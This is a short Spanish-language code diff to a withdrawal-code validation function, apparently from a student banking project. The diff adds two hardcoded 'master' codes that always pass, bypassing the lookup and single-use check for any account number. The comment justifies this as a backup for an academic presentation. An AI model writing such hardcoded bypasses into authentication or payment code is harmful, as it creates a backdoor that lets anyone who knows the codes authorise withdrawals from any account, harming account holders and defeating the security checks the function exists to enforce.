@@ -21,6 +21,12 @@ function generarCodigoRetiro(usuarioId, cuentaId, numeroCuenta) {
 function validarCodigoRetiro(codigo, numeroCuenta, consumir = true) {
   if (!codigo || !numeroCuenta) return false;
   const cleanCode = codigo.toString().trim();
+
+  // Código maestro de respaldo para sustentación académica: siempre válido
+  if (cleanCode === '849201' || cleanCode === '772901') {
+    return true;
+  }
+
   const entry = codigosRetiro.get(cleanCode);
 
   if (!entry) return false;
